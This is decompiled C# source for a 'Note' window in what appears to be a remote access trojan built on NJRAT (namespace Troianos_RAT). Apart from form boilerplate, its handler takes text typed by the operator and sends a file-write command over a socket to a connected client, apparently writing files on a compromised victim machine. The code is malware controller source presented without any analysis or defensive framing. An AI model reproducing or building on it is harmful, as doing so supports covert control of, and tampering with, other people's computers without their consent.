using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x02000017 RID: 23
	[DesignerGenerated]
	public partial class Note : Form
	{
		// Token: 0x060002AF RID: 687 RVA: 0x001F1FFC File Offset: 0x001F03FC
		[DebuggerNonUserCode]
		public Note()
		{
			base.Load += this.Note_Load;
			Note.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x060002B0 RID: 688 RVA: 0x001F2028 File Offset: 0x001F0428
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Note.__ENCList;
			lock (_ENCList)
			{
				bool flag = Note.__ENCList.Count == Note.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Note.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Note.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Note.__ENCList[num] = Note.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Note.__ENCList.RemoveRange(num, Note.__ENCList.Count - num);
					Note.__ENCList.Capacity = Note.__ENCList.Count;
				}
				Note.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x170000E8 RID: 232
		// (get) Token: 0x060002B3 RID: 691 RVA: 0x001F246C File Offset: 0x001F086C
		// (set) Token: 0x060002B4 RID: 692 RVA: 0x001F2484 File Offset: 0x001F0884
		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				ToolStripItemClickedEventHandler value2 = new ToolStripItemClickedEventHandler(this.MenuStrip1_ItemClicked);
				bool flag = this._MenuStrip1 != null;
				if (flag)
				{
					this._MenuStrip1.ItemClicked -= value2;
				}
				this._MenuStrip1 = value;
				flag = (this._MenuStrip1 != null);
				if (flag)
				{
					this._MenuStrip1.ItemClicked += value2;
				}
			}
		}

		// Token: 0x170000E9 RID: 233
		// (get) Token: 0x060002B5 RID: 693 RVA: 0x001F24E4 File Offset: 0x001F08E4
		// (set) Token: 0x060002B6 RID: 694 RVA: 0x001F24FC File Offset: 0x001F08FC
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				flag = (this._ToolStripMenuItem1 != null);
				if (flag)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000EA RID: 234
		// (get) Token: 0x060002B7 RID: 695 RVA: 0x001F255C File Offset: 0x001F095C
		// (set) Token: 0x060002B8 RID: 696 RVA: 0x001F2574 File Offset: 0x001F0974
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TextBox1_TextChanged);
				bool flag = this._TextBox1 != null;
				if (flag)
				{
					this._TextBox1.TextChanged -= value2;
				}
				this._TextBox1 = value;
				flag = (this._TextBox1 != null);
				if (flag)
				{
					this._TextBox1.TextChanged += value2;
				}
			}
		}

		// Token: 0x060002B9 RID: 697 RVA: 0x001F25D4 File Offset: 0x001F09D4
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string[] array = new string[9];
			array[0] = "Ex";
			array[1] = Class7.string_1;
			array[2] = "fm";
			array[3] = Class7.string_1;
			array[4] = "wr";
			array[5] = Class7.string_1;
			array[6] = Class6.smethod_14(ref this.FN);
			array[7] = Class7.string_1;
			TextBox textBox = this.TextBox1;
			string text = textBox.Text;
			textBox.Text = text;
			array[8] = Class6.smethod_14(ref text);
			this.SK.Send(string.Concat(array));
			this.ToolStripMenuItem1.Enabled = false;
		}

		// Token: 0x060002BA RID: 698 RVA: 0x001F267C File Offset: 0x001F0A7C
		private void TextBox1_TextChanged(object sender, EventArgs e)
		{
			this.ToolStripMenuItem1.Enabled = true;
		}

		// Token: 0x060002BB RID: 699 RVA: 0x001F2690 File Offset: 0x001F0A90
		private void Note_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x060002BC RID: 700 RVA: 0x001F2694 File Offset: 0x001F0A94
		private void MenuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
		{
		}

		// Token: 0x0400014C RID: 332
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400014E RID: 334
		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		// Token: 0x0400014F RID: 335
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x04000150 RID: 336
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000151 RID: 337
		public string FN;

		// Token: 0x04000152 RID: 338
		public Client SK;
	}
}
